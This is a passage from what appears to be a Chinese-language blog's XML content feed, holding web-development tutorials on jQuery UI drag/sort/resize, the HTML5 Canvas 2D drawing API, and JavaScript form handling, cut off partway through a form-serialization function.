src="jquery-1.12.4.js"&gt;&lt;/script&gt;&lt;script src="plugins/jquery-ui.js"&gt;&lt;/script&gt; html1234567891011121314&lt;body&gt;&lt;div class="drag-wrapper"&gt; &lt;div class="drag-bar"&gt;可拖动、排序、变形的新闻模块&lt;/div&gt; &lt;div class="resize-item"&gt; &lt;div class="sort-wrapper"&gt; &lt;ul class="sort-item"&gt; &lt;li&gt;这是第1条新闻!&lt;/li&gt; &lt;li&gt;这是第2条新闻!&lt;/li&gt; &lt;li&gt;这是第3条新闻!&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt; js1234567&lt;script&gt; $(function () &#123; $(".drag-wrapper").draggable(&#123;"handle":".drag-bar"&#125;); $(".resize-item").resizable(&#123;"handles":"s"&#125;); $(".sort-item").sortable(&#123;"opacity":"0.5"&#125;); &#125;);&lt;/script&gt; 插件制作制作插件：就是给jquery对象添加方法。 $.fn.fnName = function(){}]]></content>
      <categories>
        <category>jQuery系列</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canvas]]></title>
    <url>%2F2015%2F11%2F18%2Fcanvas%2F</url>
    <content type="text"><![CDATA[什么是 Canvascanvas 是 HTML5 提供的一个用于展示绘图效果的标签. canvas 原意画布, 帆布.在 HTML 页面中用于展示绘图效果. 最早 canvas 是苹果提出的一个方案, 今天已经在大多数浏览器中实现. canvas 的基本用法 基本语法 1&lt;canvas&gt;&lt;/canvas&gt; 使用 canvas 标签, 即可在页面中开辟一格区域. 可以设置其 width 和 height 设置该区域的尺寸. 默认 canvas 的宽高为 300 和 150. 不要使用 CSS 的方式设置宽高, 应该使用 HTML 属性. 如果浏览器不支持 canvas 标签, 那么就会将其解释为 div 标签. 因此常常在 canvas 中嵌入文本, 以提示用户浏览器的能力. canvas 的兼容性非常强, 只要支持该标签的, 基本功能都一样, 因此不用考虑兼容性问题. canvas 本身不能绘图. 是使用 JavaScript 来完成绘图. canvas 对象提供了各种绘图用的 api. canvas 的使用领域 canvas 的使用领域很多: 游戏 可视化数据(重点) banner 广告 多媒体 未来 模拟仿真 远程操作 图形编辑 基本绘图基本绘图方法绘图步骤: 获得 canvas 对象. 调用 getContext 方法, 提供字符串参数 ‘2d’. 该方法返回 CanvasRenderingContext2D 类型的对象. 该对象提供基本的绘图命令. 使用 CanvasRenderingContext2D 对象提供的方法进行绘图. 基本绘图命令 设置开始绘图的位置: context.moveTo( x, y ). 设置直线到的位置: context.lineTo( x, y ). 描边绘制: context.stroke(). 填充绘制: context.fill(). 闭合路径: context.closePath(). 01-绘制基本线1234567891011121314151617var canvas = document.createElement( 'canvas' );canvas.width = 500;canvas.height = 400;canvas.style.border = '1px dashed red';document.body.appendChild( canvas );// 获得 CanvasRenderingContext2D 对象var context = canvas.getContext( '2d' );// 设置 起点context.moveTo( 0, 0 );// 绘制直线context.lineTo( 500, 400 );// 设置 起点context.moveTo( 0, 400 );// 绘制直线context.lineTo( 500, 0 );// 描边显示效果context.stroke(); 运行结果为: 计算机直角坐标系 分析 需要绘图就需要有 canvas 标签, 该标签用于展示图像. canvas 的宽高不要使用 CSS 来设置, 会有拉伸的问题. 应该直接使用属性设置. 但是 canvas 只是展示图像的标签, 它没有绘图的能力. 需要使用 canvas 的上下文工具来实现绘图. 使用 canvas.getContext(&#39;2d&#39;) 可以获得绘图工具, 该工具是 CanvasRenderingContext2D 类型的对象. 需要绘图, 首选设置绘图的起点. 使用 canvas 绘图, 需要主要的是他主张先描点, 再连线绘制效果. 因此需要首先设置起点, 然后在起点的基础上描述其他需要的点. 使用 CanvasRenderingContext2D.moveTo(x, y) 方法设置起点. 其中 x, y 表示的是在坐标系中的位置. 使用 CanvasRenderingContext2D.lineTo(x, y) 来描述绘制直线的下一个点. 依次类推可以描述多个点. 描点结束后, 需要使用 CanvasRenderingContext2D.stroke() 方法来连线. 开可以显示出效果. getContext 方法语法: Canvas.getContext(typeStr) 描述: 该方法用于绘制上下文工具. 如果是绘制平面图形使用 &#39;2d&#39;作为参数, 如果绘制立体图形使用 &#39;webgl&#39;. 使用 &#39;2d&#39; 返回 CanvasRenderingContext2D 类型的对象. 使用 &#39;webgl&#39; 返回 WebGLRenderingContext 类型的对象. moveTo 方法语法: CanvasRenderingContext2D.moveTo(x, y) 描述: 该方法用于设置绘制起点. 其中参数 x, y 表示在坐标系中的位置, 分别是 x 坐标与 y 坐标. lineTo 方法语法: CanvasRenderingContext2D.lineTo(x, y) 描述: 该方法用于设置需要绘制直线的另一个点. 最终描边后会连线当前点和方法参数描述的点. 其中参数 x, y 表示在坐标系中的位置, 分别是 x 坐标与 y 坐标. stroke 方法语法: CanvasRenderingContext2D.stroke() 描述: 该方法用于连线, 将描述的所有点按照指定顺序连接起来. 总结 绘图先要获得上下文, 即绘图工具 绘图需要设置开始的坐标 绘图是先描点, 然后一个一个依次连线 依次绘图只能绘制单一样式(色彩等) 绘制直线图形 绘制直线计算坐标. 描边调用 CanvasRenderingContext2D.stroke() 方法. 填充使用 CanvasRenderingContext2D.fill() 方法. fill 方法语法: CanvasRenderingContext2D.fill() 描述: 该方法会按照描绘的点的路径来填充图形. 默认是黑色. 非零环绕原则非零环绕原则 说明: 在 canvas 中使用各种方法描点实际上描述的是一个称为路径( path )的东西. 在 canvas 绘图中, 所有描述的东西都是路径, 只有最后填充或描边的时候才会显示出效果. 每一个路径都是一个状态. 闭合路径closePath 方法 语法: CanvasRenderingContext2D.closePath() 描述: 使用该方法可以将最后一个描点与最开始的描点自动连接起来. 闭合路径的一个例子 123456...ctx.moveTo( 100, 100 );ctx.lineTo( 300, 100 );ctx.lineTo( 300, 200 );ctx.closePath();ctx.stroke(); 结果为: 路径的概念 路径就是一次绘图 类比使用油漆刷墙面 首先打底色, 绝对不会一次性使用多个色彩 一定是先画完某一个色彩再考虑另一个色彩 除非需要自己创作才会考虑墙面绘画 路径就好比一桶油漆和一把刷子, 一次性描点绘制. 如果重新更换油漆, 那么是绘制另一个区域. 如果需要开启新的绘制, 那么使用 CanvasRenderingContext2D.beginPath() 方法. 线型相关属性设置描边与填充不一定只能使用黑色的细线. 可以利用一些属性设置其效果 CanvasRenderingContext2D.lineWidth 设置线宽. CanvasRenderingContext2D.lineCap 设置线末端类型. CanvasRenderingContext2D.lineJoin 设置相交线的拐点. CanvasRenderingContext2D.getLineDash() 获得线段样式数组. CanvasRenderingContext2D.setLineDash() 设置线段样式. CanvasRenderingContext2D.lineDashOffset 绘制线段偏移量. 设置线宽语法: CanvasRenderingContext2D.lineWidth = number 描述: 设置线宽. 设置线末端类型语法: CanvasRenderingContext2D.lineCap = value 描述: 设置线型末端的样式, 可取值为: ‘butt’( 默认 ), ‘round’, ‘square’. ‘butt’ 表示两端使用方形结束. ‘round’ 表示两端使用圆角结束. ‘square’ 表示突出的圆角结束. 设置相交线的拐点语法: CanvasRenderingContext2D.lineJoin = value 描述: 设置两条直线的拐点描述方式. 可以取值 ‘round’, ‘bevel’, ‘miter’(默认) ‘round’ 使用圆角连接. ‘bevel’ 使用平切连接. ‘miter’ 使用直角转. 虚线语法: CanvasRenderingContext2D.lineDashOffset = numberCanvasRenderingContext2D.getLineDash()CanvasRenderingContext2D.setLineDash() 描述: setLineDash 用于设置开始绘制虚线的偏移量. 数字的正负表示左右偏移. getLineDash() 与 setLineDash() 方法使用数组描述实线与虚线的长度. 填充与描边样式语法: CanvasRenderingContext2D.strokeStyle = valueCanvasRenderingContext2D.fillStyle = value 描述: strokeStyle 可以设置描边颜色, 与 CSS 的语法一样 fillStyle 设置填充颜色, 与 CSS 语法一样 这两个属性还可以设置渐变对象. 一个例子 12345678for (var i=0;i&lt;6;i++)&#123; for (var j=0;j&lt;6;j++)&#123; ctx.strokeStyle = 'rgb(0,' + Math.floor(255-42.5*i) + ',' + Math.floor(255-42.5*j) + ')'; ctx.beginPath(); ctx.arc(12.5+j*25,12.5+i*25,10,0,Math.PI*2,true); ctx.stroke(); &#125;&#125; 绘制形状绘制图形不仅仅是利用线条来实现绘图, 还可以有快捷的绘制图形的办法 绘制矩形 绘制圆弧 绘制矩形绘制矩形的方法 CanvasRenderingContext2D.strokeRect CanvasRenderingContext2D.fillRect CanvasRenderingContext2D.rect 注意: rect 方法就是矩形路径, 还需要使用 fill 或 stroke 才可以看到效果. 因此一般使用 strokeRect 或 fillRect 直接可以看到结果. 清除矩形区域: CanvasRenderingContext2D.clearRect 绘制矩形框语法: CanvasRenderingContext2D.strokeRect(x, y, width. height) 描述: 用来绘制一个矩形. 比起直接使用 moveTo 和 lineTo 方法要简单许多. 该方法的前两个参数表示绘制矩形的左上角的坐标. 后两个参数表示这个矩形的宽高. 使用该方法不需要使用 moveTo 方法设置起始点, 也不需要调用 stroke 等绘画方法. 绘制的矩形支持 strokeStyle 设置颜色样式. 绘制填充矩形语法: CanvasRenderingContext2D.fillRect(x, y, width. height) 描述: 用来绘制一个矩形. 比起直接使用 moveTo 和 lineTo 方法要简单许多. 该方法的前两个参数表示绘制矩形的左上角的坐标. 后两个参数表示这个矩形的宽高. 使用该方法不需要使用 moveTo 方法设置起始点, 也不需要调用 stroke 等绘画方法. 绘制的矩形支持 fillStyle 设置颜色样式. 清除矩形区域语法: CanvasRenderingContext2D.clearRect(x, y, width, height) 描述: 用于清除画布中的矩形区域的内容. 参数 x, y 表示矩形区域左上角的坐标, width 与 height 表示矩形区域的宽高. 绘制圆弧绘制圆弧的方法有 CanvasRenderingContext2D.arc() CanvasRenderingContext2D.arcTo() 绘制圆弧语法: CanvasRenderingContext2D.arc(x, y, radius. startAngle. endAngle, anticlockwise) 描述: 该方法用于绘制一段弧, 配合开始点的位置 与 stroke 方法或 fill 方法可以绘制扇形. 方法中的前两个参数 x, y 表示绘制圆弧的圆心坐标. 参数 radius 表示圆弧半径, 单位为弧度. 参数 startAngle 与 endAngle 表示开始到结束的角度. 角度以水平向右为 0 弧度, 顺时针为正方向. 参数 anticlockwise 表示是否采用默认的正向角度, 如果传入 true 表示逆指针为正. 该参数可选. 注意事项使用 arc 绘图的时候, 如果没有设置 moveTo 那么会从开始的绘弧的地方作为起始点. 如果设置了 moveTo, 那么会连线该点与圆弧的起点.如果使用 stroke 方法, 那么会从开始连线到圆弧的起始位置. 如果是 fill 方法, 会自动闭合路径填充. 绘制扇形绘制扇形的重点是需要设置起始位置为圆心点, 然后闭合路径即可 123456789101112... ctx.strokeStyle = 'red'; ctx.fillStyle = 'pink'; ctx.moveTo( 100, 200 ); ctx.arc( 100, 200, 100, -Math.PI/3, Math.PI/3 ); ctx.closePath(); ctx.stroke(); ctx.beginPath(); ctx.moveTo( 300, 200 ); ctx.arc( 300, 200, 100, -Math.PI/3, Math.PI/3 ); ctx.closePath(); ctx.fill(); 效果 绘制饼形图绘制饼形图最大的特点是角度是叠加的. 开始从 -Math.PI/2 开始绘制, 达到执行角 x 后, 下一个区域从 x 开始绘制, 然后有到一个角 y 停下来. 如此反复到 Math.PI * 3 / 2 结束. 三等分饼形图绘制一个三等分的饼形图, 颜色使用 红, 绿, 蓝. 123456789101112var x = 200, y = 200, r = 100, step = Math.PI * 2 / 3, // 120 度一个区域 start = -Math.PI / 2, // 起始角度 colors = [ 'red', 'green', 'blue' ];for ( var i = 0; i &lt; 3; i++ ) &#123; ctx.beginPath(); ctx.moveTo( x, y ); ctx.fillStyle = colors[ i ]; ctx.arc( x, y, r, start, start+=step ); ctx.fill();&#125; 绘制相切弧语法: CanvasRenderingContext2D.arcTo( x1, y1, x2, y2, radius) 描述:该方法用于绘制圆弧 绘制的规则是当前位置与第一个参考点连线, 绘制的弧与该直线相切. 同时连接两个参考点, 圆弧根据半径与该连线相切 例如有一个起始点 (100, 100), 那么绘制其点. 颜色设置为红色. 12ctx.fillStyle = 'red';ctx.fillRect(100 - 4, 100 - 4, 8, 8); 然后两个参考点分别为 (100, 300) 和 (300, 300), 绘制出该点 12ctx.fillRect(100 - 4, 300 - 4, 8, 8);ctx.fillRect(300 - 4, 300 - 4, 8, 8); 连接两个参考点 12345ctx.beginPath();ctx.strokeStyle = 'red';ctx.moveTo(100, 300);ctx.lineTo(300, 300);ctx.stroke(); 得到效果为: 调用 arcTo 方法绘制圆弧. 记得将起始点设置为 (100, 100) 12345ctx.beginPath();ctx.strokeStyle = 'blue';ctx.moveTo(100, 100);ctx.arcTo(100, 300, 300, 300, 100);ctx.stroke(); 得到效果： 注意: 使用该方法可以使用圆弧连接两条直线, 而不用计算复杂的起始角度与结束角度. 因此用于绘制圆角矩形等案例较多. 绘制圆角矩形封装一个函数, 用于绘制圆角矩形. 参考 rect 方法, 需要坐标参数 x, y. 由于设置圆角, 因此需要设置圆角半径 cornerRadius. 还需要提供宽高. 首先绘制一个矩形边框. 但是需要考虑圆角, 虽然从 x, y 开始绘制, 但是中间要空出半径的距离. 1234567891011var x = 100, y = 100, width = 300, height = 100, cornerRadius = 10;ctx.strokeStyle = 'red';ctx.moveTo(x + cornerRadius, y);ctx.lineTo(x + width - cornerRadius, y);ctx.moveTo(x + width, y + cornerRadius);ctx.lineTo(x + width, y + height - cornerRadius);ctx.moveTo(x + width - cornerRadius, y + height);ctx.lineTo(x + cornerRadius, y + height);ctx.moveTo(x, y + height - cornerRadius);ctx.lineTo(x, y + cornerRadius);ctx.stroke(); 效果为 然后再分别绘制四个角, 设置当前位置与参考点的位置. 设置当前位置为一个线端点, 然后参考点依次就是 矩形顶点 和 另一个线段的端点. 12ctx.moveTo(x + cornerRadius, y);ctx.arcTo(x, y, x, y + cornerRadius, cornerRadius); 即可得到 同理绘制另外三个圆角 123456ctx.moveTo(x + width - cornerRadius, y);ctx.arcTo(x + width, y, x + width, y + cornerRadius, cornerRadius);ctx.moveTo(x + width, y + height - cornerRadius);ctx.arcTo(x + width, y + height, x + width - cornerRadius, y + height, cornerRadius);ctx.moveTo(x + cornerRadius, y + height);ctx.arcTo(x, y + height, x, y + height - cornerRadius, cornerRadius); 即可得到 封装成方法就可以绘制更多圆角矩形了. 封装中注意 beginPath() 和 save() 和 restore() 123456789101112131415161718192021222324function cRect (x, y, width, height, cornerRadius, color) &#123; ctx.save(); ctx.beginPath(); ctx.strokeStyle = color || 'red'; ctx.moveTo(x + cornerRadius, y); ctx.lineTo(x + width - cornerRadius, y); ctx.moveTo(x + width, y + cornerRadius); ctx.lineTo(x + width, y + height - cornerRadius); ctx.moveTo(x + width - cornerRadius, y + height); ctx.lineTo(x + cornerRadius, y + height); ctx.moveTo(x, y + height - cornerRadius); ctx.lineTo(x, y + cornerRadius); // 开始绘制四个圆角 ctx.moveTo(x + cornerRadius, y); ctx.arcTo(x, y, x, y + cornerRadius, cornerRadius); ctx.moveTo(x + width - cornerRadius, y); ctx.arcTo(x + width, y, x + width, y + cornerRadius, cornerRadius); ctx.moveTo(x + width, y + height - cornerRadius); ctx.arcTo(x + width, y + height, x + width - cornerRadius, y + height, cornerRadius); ctx.moveTo(x + cornerRadius, y + height); ctx.arcTo(x, y + height, x, y + height - cornerRadius, cornerRadius); ctx.stroke(); ctx.restore();&#125; 绘制文本绘制文本的方法 CanvasRenderingContext2D.fillText() CanvasRenderingContext2D.strokeText() CanvasRenderingContext2D.measureText() 文本样式 CanvasRenderingContext2D.font CanvasRenderingContext2D.textAlign CanvasRenderingContext2D.textBaseline 绘制文字语法: CanvasRenderingContext2D.strokeText(text, x, y[, maxWidth]) CanvasRenderingContext2D.fillText(text, x, y[, maxWidth]) 描述: 这两个方法的功能都是在给定的 x, y 坐标下绘制文本内容.stroke 绘制描边文字, 文字内空心. fill 绘制填充文字, 即实心文字.最后一个参数可选, 用于限制文字的总宽. 特殊条件下, 系统会自动调整文字宽度与大小以适应该参数限制. 计算文本尺寸语法: CanvasRenderingContext2D.measureText() 描述: 该方法返回一个文本尺寸对象, TextMetrics 对象.TextMetrics 对象属性很多, 常用的 width 属性可以获取文字的宽度. 设置文字属性设置文字字体语法: CanvasRenderingContext2D.font = value 描述: 该属性用于设置绘制字体的各种信息, 与 CSS 语法一致, 设置字体形状, 样式, 字号粗细等. 其顺序可以是: style | variant | weight | size/line-height | family. 默认值为 10px sans-serif 设置字体水平对齐方式语法: CanvasRenderingContext2D.textAlign = value 描述: 该属性用于设置文字的水平对齐方式. 设置文字居中, 靠左右对齐等. 该属性可以设置的值有: start( 默认 ), end, left, right, center. start 表示根据参考基准点的垂直直线左靠对齐 end 表示根据参考基准点的垂直直线右靠对齐 left 与 right 就是左对齐与右对齐的意思 最后 center 就是居中的含义. 设置字体垂直对齐方式语法: CanvasRenderingContext2D.textBaseline = value 描述: 该方法设置文字在垂直方向上的对齐方式. 该属性可以取值: top, middle, bottom, hanging, alphabetic, ideographic 基于参考点的直线, 其中 top, middle, buttom 分别表示靠上, 居中, 靠下对齐. alphabetic 表示字母基线, 类似于英文字母的对齐方式. 例如 a, g, f 等字母. ideographic 表意对齐. 使用字母对齐中超出的字母为参考. 即比字母基线略靠下. 所有的对齐方式是根据文字特点相关的. 对于中文主要使用的还是 top, bottom 和 middle. top, middle, bottom 使用的较多 alphabetic 表示字母参考线, ideographic 会比它低一点, hanging 表示悬挂. 实际上大多数参考方式只有在特定语言中有作用, 而且与字体也有相对复杂的关系. 例如( 下图是有部分错误的 ): 绘制图片绘制图像虽然只有一个 drawImage 函数, 但是该函数有多重参数形式. CanvasRenderingContext2D.drawImage( img, dx, dy ) CanvasRenderingContext2D.drawImage( img, dx, dy, dWidth, dHeight ) CanvasRenderingContext2D.drawImage( img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight ) 绘制简单图像语法: CanvasRenderingContext2D.drawImage(img, dx, dy) 描述: 使用三个参数, 允许在画布上的 任意位置 绘制图片. 参数 img 是指图片对象. 可以是 img 标签, 或者是 video 标签, 已经另一个 canvas 等. 需要注意的是如果直接添加 img 对象是不可以的, 需要等待其加载. 准备一张网络图片, 绘制, 便于查看其加载过程. 12345678// 随便从百度中搜索 '美女头像', 记录一个链接地址var url = 'https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3289155966,3850025949&amp;fm=116&amp;gp=0.jpg';// 创建 img 对象var img = new Image(); // 就是 img 标签// 设置 src 属性为 图片img.src = url;// 绘图ctx.drawImage( img, 100, 100 ); 此时没有任何结果, 打开调试工具查看 Net Work; 因为加载图片需要时间, 因此将绘制的方法放在 onload 事件中. 12345678910// 随便从百度中搜索 '美女头像', 记录一个链接地址var url = 'https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3289155966,3850025949&amp;fm=116&amp;gp=0.jpg';// 创建 img 对象var img = new Image(); // 就是 img 标签// 设置 src 属性为 图片img.src = url;// 绘图img.onload = function () &#123; ctx.drawImage(img, 100, 100);&#125;; 注意: 这里使用 new Image()与 document.createElement(&#39;img&#39;)是一样的. 在指定区域内绘制图像当图片比较大的时候, 如果使用这样的方式绘图, 那么图片可能会完全覆盖画布。因此, 需要将其控制在一个矩形区域内绘制. 语法:CanvasRenderingContext2D.drawImage(img, dx, dy, dWidth, dHeight) 描述: 参数 dWidth, dHeight 表示绘制的矩形区域. 绘制的 dx, dy 坐标决定了开始. 该方法绘制的图像会在指定范围内被压缩显示. 如果希望正常显示, 需要固定一个宽度或者高度, 然后根据比例计算出另一个值. 这里假定高度是 100. 计算宽度后绘图. 123456...var heigth = 100, width;img.onload = function () &#123; width = img.width * height / img.height; ctx.drawImage( img, 100, 100, width, height );&#125;; 绘制任意图像类似于 CSS 中处理按钮等小图标的技巧, 将很多的效果图集中在一张 png 格式的背景透明的图片中, 这样可以提高效率也便于维护. 那么 drawImage 同样支持该方式绘图. 在画布中的指定位子与指定区域内, 绘制图片中的某个矩形区. 语法: CanvasRenderingContext2D.drawImage(img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight) 描述: 这里的带有 s 前缀的参数就是指图源的矩形区域. 例如将图片的 ( 100, 100, 300, 200 ) 处的内容绘制到页面的 ( 100, 100, 300, 200 ) 的位置. 1ctx.drawImage(img, 100, 100, 300, 200, 100, 100, 300, 200); 变换Canvas 绘图中支持矩阵变换功能. 其中涉及的常用方法有: CanvasRenderingContext2D.transform() CanvasRenderingContext2D.scale() CanvasRenderingContext2D.translate() CanvasRenderingContext2D.rotate() CanvasRenderingContext2D.setTransForm() 还有一些方法, 暂时没有普及与确定. 因此这里的几个方法才是最常用的方法. 什么是变换计算机图形学是建立在解析几何基础之上的. 也就是说所有绘制的图形都是基于坐标进行计算得到的. 那么利用坐标系位置的调整, 同样的坐标可以得到不同的效果. 平移变换平移变换就是将原有坐标轴进行平行移动, 那么坐标轴移动后就可以使用新坐标来绘制图形了. 语法: CanvasRenderingContext2D.translate(x, y) 描述: 该方法将坐标进行平移. x 表示水平移动, 正数向右, 负数向左. y 表示垂直移动, 正数向下, 负数向上. 变换可以重复调用, 变换是可以累加的. 使用该变换, 常常用于绘制不同位置, 但是形状重复的图形. 注意: 变换也会被 “继承”, 开启新路径后依旧保留原先变换. 旋转变换语法: CanvasRenderingContext2D.rotate(radian) 描述: 该方法将坐标轴进行旋转变换. 参数是弧度, 表示旋转的方式. 正数表示顺时针旋转, 负数表示逆时针旋转. 该变换常常用于实现旋转动画等. 缩放变换语法: CanvasRenderingContext2D.scale(x, y) 描述: 该方法实现水平与垂直的缩放. 参数 x 控制水平缩放倍率. 传参 1 表示不作缩放, 传入大于 1 的数字表示扩大. 参数 y 控制垂直缩放倍率. 传参 1 表示不作缩放, 传入大于 1 的数字表示扩大. 该变换常常用于放大与缩小, 以及反转的效果. 环境前面提到 Canvas 是含有状态的, 也就是说需要修改颜色, 直线样式, 绘图方式等效果时需要开启一个新的状态. 但是有时在绘制过程中需要修改状态, 同时绘制完当前状态后又需要回到之前的状态中继续绘制另外的形状. 那么只有再将修改过的样式载更改回来. 如果在该状态中修改的属性较多, 那么每次在回到之前状态时就有很多的代码. Canvas 中引入了状态的保持机制. 使用 CanvasRenderingContext2D.save() 方法可以保存当前状态. 如果需要恢复到已经保存的状态, 只需要调用 CanvasRenderingContext2D.restore() 方法即可. 状态保持的机制是基于状态栈实现的. 也就是说 save 一次就存储一个状态. restore 一次就将刚刚存入的恢复. 如果 save 两次, 就需要 restore 两次, 才可以恢复到最先的状态. 一般在封装绘图的时候都会采用开始绘制之前, save 一次, 然后 开启一个新路径, 然后绘制结束后 restore, 然后再开启一个新路径. 这样保持当前状态不会对其他绘图代码构成影响. 优化canvas 在绘制图片的时候, drawImage 方法还支持将一个 canvas 绘制到另一个 canvas 中. 因此使用该功能, 可以在内存中完成复杂的绘图, 将绘制好的半成品再绘制到 canvas 中合成需要的效果. 画布保存画布在绘制后实际上就是一张图片, 可以直接右键另存为. 同时也支持使用 js 代码将其保存为 base64 编码的字符串. 语法: Canvas.ToDataURL(type, encoderOptions) 描述: 该方法可以将画布转换成 base64 格式的数据 type 表示输出类型. 例如: image/png 或 image/jpeg 等 encoderOptions 表示图片输出质量, 其取值在 0 到 1 之间. 如果是 1, 表示无损压缩, 必须使用 image/jpeg 或 image/webp 才起作用 渐变和图案绘制图像有两个主要方法, 一个是描边, 一个是填充. 前面介绍过要设置其样式, 可以使用 strokeStyle 和 fillStyle 属性, 只需要给它们提供颜色就可以了. 但是不仅仅是颜色, 它还支持渐变和重复. 相关方法 CanvasRenderingContext2D.createLinearGradient() CanvasRenderingContext2D.createRadialGradient() CanvasRenderingContext2D.createPattern() 线性渐变语法: CanvasRenderingContext2D.createLinearGradient(x0, y0, x1, y1) 描述: 该方法返回一个 CanvasGradient 对象. 用于描述渐变的方式. 该方法有两个参数, 用于表示线型渐变的方向与位置. 使用的时候, 首先创建一个 CanvasGradient 对象, 然后利用 addColorStop 方法添加颜色区间. 方法语法: CanvasGradient.addColorStop( rate, color ). 该方法用于设置在某个比例位置的颜色是什么.rate 的取值是 0 到 1 之间. 可以添加多个渐变点. 然后将该对象赋值给 *Style 属性即可. 注意: 渐变点的坐标是基于坐标轴来计算的. 放射渐变语法: CanvasRenderingContext2D.createRadialGradient(x0, y0, r0, x1, y1, r1) 描述: 该方法实现放射渐变, 渐变的是在两个圆之间. 一般会使用两个内含关系的圆. 前三个参数分别表示其中一个圆的圆心的坐标, 以及半径. 后三个参数分别表示另一个圆的圆心的坐标, 以及半径. 绘制渐变效果用法与线性渐变一样. 重复填充语法: CanvasRenderingContext2D.createPattern(img, repetition) 描述: 该方法表示使用图片来填充的设置方法. 需要两个参数, 一个是图片, 一个是重复的方式. 图片允许是 img 标签, 图片, canvas 等对象 可选择的重复方式与 CSS 一致. 有: repeat, repeat-x, repeat-y, no-repeat. 如果是 空或””, 但不是 undefined, 默认就是 repeat.]]></content>
      <categories>
        <category>Canvas系列</category>
      </categories>
      <tags>
        <tag>canvas</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js的表单]]></title>
    <url>%2F2015%2F11%2F08%2Fjs%E7%9A%84%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"><![CDATA[JavaScript 最初的一个应用就是分担服务器处理表单的责任，打破处处依赖服务器的局限。 表单基础HTML 中表单是由 &lt;form&gt; 元素来表示的。在 JavaScript 中，表单对应的则是 HTMLFormElement 类型。有下列属性和方法。 acceptCharset: 服务器能够处理的字符串 action: 接收请求的 URL elements: 表单中所有控件的集合 enctype: 请求的编码类型 length: 表单中所有的控件的数量 method: 表单要发送的 HTTP 请求类型，通常是 “get” 或者 “post” name: 表单的名称 reset(); 将所有的表单域重置为默认值 submit(); 提交表单 target(); 用于发送请求和接收响应的窗口名称 共有表单的字段属性 disabled: 布尔值，表示当前表单是否被占用。 form: 指向当前字段所属表单的指针；只读。 name: 当前字段名称。 readOnly: 布尔值，表示当前字段是否只读。 tabIndex: 表示当前字段的切换序号。 type: 当前字段的类型。 value: 当前字段将被提交给服务器的值。 共有的表单字段方法 focus(); 用于将浏览器的焦点设置到表单字段。 blur(); 共有的表单事件 focus blur change：对于 &lt;input&gt; 和 &lt;textaera&gt; 元素，当它们失去焦点而且 value 值改变时该事件触发。 submit 阻止表单默认的同步提交的方式。 123456$("#form").on("submit", function(e)&#123; e.preventDefault(); $.ajax(&#123; // 代码段 &#125;);&#125;); 文本框脚本 type: text 可以通过设置 size 的值指定文本框中能够显示的字符数，通过 value 设置文本框中的初始值，通过 maxlength 指定文本框可以接收的最大字符数。 选择文本选择文本 select() 方法 12var textbox = document.forms[0].elements("textbox1");textbox.select(); 在文本获得焦点时选择所有文本。 取得选择的文本两个属性： selectionStart selectionEnd 12345var textbox = document.forms[0].elements("textbox1");textbox.select();function getSelectedText(textbox) &#123; return textbox.value.substring(textbox.selectionStart, selectionEnd);&#125; IE9+, FireFox, Safari, Chrome, Opera 支持 选择部分文本 setSelectionRange() 方法 两个参数：要选择的第一个字符的索引和要选择的最后一个字符的索引 IE9+, FireFox, Safari, Chrome, Opera 支持 IE8 以及之前版本：必须先使用 createTextRange(),然后调用 collapse() 将范围折叠到文本框开始位置，使用 moveStart() 和 moveEnd。 过滤输入屏蔽字符屏蔽字符需要结合键盘码，如果需要屏蔽特定的字符，需要检测 keypress 事件对应的字符编码，然后再做决定如何响应。 操作剪切板剪切板事件。 beforecopy copy beforecut cut beforepaste paste 1234567891011121314var EventUtil = &#123; // 其它代码省略... getClipboardText: function(event) &#123; var clipboardData = (event.clipboardData || window.clipboardData); return clipboardData.getData("text"); &#125;, setClipboardText: function(event) &#123; if (event.clipboardData) &#123; return event.clipboardData.setData("text/plain", value); &#125; else if (window.clipboardData) &#123; return window.clipboardData.setData("text/plain", value); &#125; &#125;&#125; 自动切换焦点常见的一种方式是用户在填写完当前字段时，自动将焦点切换到下一个字段。 123456789101112131415function tabForword(event) &#123; event = EventUtil.getEvent(event); var target = EventUtil.getTarget(event); if (target.value.length == target.maxLength) &#123; var form = target.form; for (var i = 0; i &lt; form.elements.length; i++) &#123; if (form.elements[i] == target) &#123; if (form.elements[i+1]) &#123; form.elements[i+1].focus(); &#125; return; &#125; &#125; &#125;&#125; HTML5 约束验证 API支持的浏览器 FireFox 4+, Safari 5+, Chrome, Opera 10+。 必填字段 required 检查是否支持 required 字段： 1var isRequiredSupported = "required" in document.createElement("input"); 其它输入类型HTML5 为 type 又添加了几个类型： url email 数值范围 number range datetime datetime-local date month week time 输入模式HTML5 新增了 pattern 属性，值是正则表达式。 检验有效性 checkValidty() 方法 validity 对象 customError patternMismatch rangeOverflow stepMisMatch tooLong typeMismatch valid valueMissing 禁用验证 novalidate 属性，表单不验证 formnovalidate 属性，某个提交按钮不验证 选择框脚本是通过 &lt;select&gt; 和 &lt;option&gt;。 add(newOption, relOption): 向控件中插入新的 &lt;option&gt; 元素，其位置在相关项之前。 multiple: 允许多选 options: 所有 &lt;option&gt; 的集合 remove(index): 移除给定位置的选项 selectedIndex: 基于 0 的选中项的索引 size: 选择框中可见行数 选择选项 appendChild() new Option(“Option text”, “Option value”); 表单序列化浏览器给服务器发送数据： 对表单中的字段的名称和值进行 URL 编码，使用 &amp; 分隔 不发送禁用的表单字段 只发送勾线的复选框和单选按钮 单选选择框中的每个选中的值单独一个条目 在单击提交表单的情况下，也会发送提交按钮；否则，不发送提交按钮。 &lt;select&gt; 元素的值，就是选中的 &lt;option&gt; 元素的 value 特性的值。如果 &lt;option&gt; 元素没有 value 属性，则是 &lt;option&gt; 元素的文本值。 表单序列化过程中，一般不包含任何按钮字段，因为结果字符串很可能是通过其他方式提交的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function serialize(form) &#123; var parts = [], field = null, i, len, j, optLen, option, optValue; for (i = 0, len = form.elements.length; i &lt; len; i++) &#123; field = form.elements[i]; switch(field.type) &#123; case "select-one": case "select-multipule": if (field.name.length) &#123; for 